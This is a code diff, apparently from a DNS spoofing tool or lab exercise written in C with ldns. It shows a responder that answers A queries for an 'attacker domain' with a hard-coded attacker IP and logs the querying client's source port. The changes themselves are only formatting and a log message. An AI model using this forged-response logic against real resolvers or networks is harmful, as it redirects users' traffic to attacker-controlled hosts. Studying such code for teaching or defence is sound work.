@@ -127,8 +127,8 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
   const char *attacker_ip = "192.168.1.201";
   // sanity check
   if(qtype==LDNS_RR_TYPE_A &&
-      qclass==LDNS_RR_CLASS_IN &&
-      strcmp(qname,attacker_target)==0){
+     qclass==LDNS_RR_CLASS_IN &&
+     strcmp(qname,attacker_target)==0){
     printf("-> matching A query for attacker domain, sending A=%s\n",
            attacker_ip);
     // create RDF for the owner name and IP address
@@ -199,7 +199,7 @@ int send_dns_response(int sockfd, struct sockaddr_in *client_addr,
   }
 
   int sent = (int)sendto(sockfd, response_wire, response_size, 0,
-                    (struct sockaddr *)client_addr, sizeof(*client_addr));
+                         (struct sockaddr *)client_addr, sizeof(*client_addr));
   free(response_wire);
 
   return (sent < 0) ? -1 : 0;
@@ -311,8 +311,7 @@ int main() {
       perror("recvfrom");
       continue;
     }
-    printf("Got %zd bytes from address %s: source port %u\n",bytes_received,
-           inet_ntoa
+    printf("Got %zd bytes from %s:%u\n",bytes_received,inet_ntoa
         (client_addr.sin_addr),(unsigned int)ntohs(client_addr.sin_port));
 
     // Handle the DNS query and capture source port
